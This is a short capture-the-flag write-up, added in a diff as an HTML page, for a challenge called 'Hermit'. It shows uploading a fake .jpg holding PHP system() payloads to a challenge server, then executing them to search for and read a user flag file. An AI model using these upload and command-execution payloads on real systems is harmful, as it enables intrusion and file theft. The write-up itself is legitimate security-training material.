@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="" xml:lang="">
+<head>
+  <meta charset="utf-8" />
+  <meta name="generator" content="pandoc" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
+  <title>Hermit Part1</title>
+  <style>
+      code{white-space: pre-wrap;}
+      span.smallcaps{font-variant: small-caps;}
+      span.underline{text-decoration: underline;}
+      div.column{display: inline-block; vertical-align: top; width: 50%;}
+  </style>
+  <!--[if lt IE 9]>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv-printshiv.min.js"></script>
+  <![endif]-->
+    <head>
+      <link rel="stylesheet" type="text/css" href="../../css/global.css"></link>
+      <script type="text/javascript" src="../../js/common.js"></script>
+    </head>
+</head>
+<body>
+    <div id="header"><a class="header" href="../../index.html">[]|\|[-/-\|_/\/\[]|\||)</a></div>
+    <div id="content" class="content" style="width:70%;height:auto">
+<header id="title-block-header">
+<h1 class="title">Hermit Part1</h1>
+</header>
+<p>Create a file <code>hermit-file.jpg</code> with payload <code>&lt;?php phpinfo() ?&gt;</code></p>
+<pre><code>http --form -v POST  http://104.197.195.221:8086/upload.php fileToUpload@hermit-file.jpg</code></pre>
+<p>File has been uploaded to a file with random generate name in <code>/var/www/html/uploads/</code>, and in response we can find the new file name. Now let’s visit it</p>
+<pre><code>http -v http://104.197.195.221:8086/show.php?filename=GO6ZR6</code></pre>
+<p>Phpinfo is shown as expected.</p>
+<p>Try to find any file contains the word <code>flag</code>.</p>
+<pre><code>&lt;?php system(&quot;grep -Ri flag *&quot;); ?&gt;</code></pre>
+<p>A long list of files come out, some of them contain the following path.</p>
+<pre><code>/home/hermit/flag/userflag.txt</code></pre>
+<p>Try to get the file content.</p>
+<pre><code>&lt;?php system(&quot;cat /home/hermit/flag/userflag.txt&quot;); ?&gt;</code></pre>
+<p>In response is the flag.</p>
+    </div>
+    <a id="back-to-top" class="back-to-top" href="#header">TOP</a>
+</body>
+</html>
